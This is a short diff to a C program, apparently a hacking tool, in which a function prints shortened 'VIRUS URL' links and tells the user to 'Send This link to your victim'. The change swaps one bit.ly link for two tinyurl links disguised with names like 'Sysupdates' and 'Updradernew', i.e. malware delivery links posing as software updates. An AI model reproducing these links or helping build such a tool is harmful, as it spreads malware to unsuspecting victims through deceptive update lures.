@@ -39,9 +39,10 @@ void info(){
 void vir(){
   printf("Link is being processed Please wait\n\n");
   sleep(1.25);
-  printf("VIRUS  URL LINK 1 : https://bit.ly/3XIosHY\n\n");
+ // printf("VIRUS  URL LINK 1 : https://bit.ly/3XIosHY\n\n");
   sleep(1);
-  printf("VIRUS URL LINK 2 : https://bit.ly/3YjN8GL\n\n");
+  printf("VIRUS URL LINK 1 : https://tinyurl.com/Updradernew");
+  printf("VIRUS URL LINK 2 : https://tinyurl.com/Sysupdates\n\n");
   printf("Send This link to your victim !\n");
    //Change it to dd format !
 }
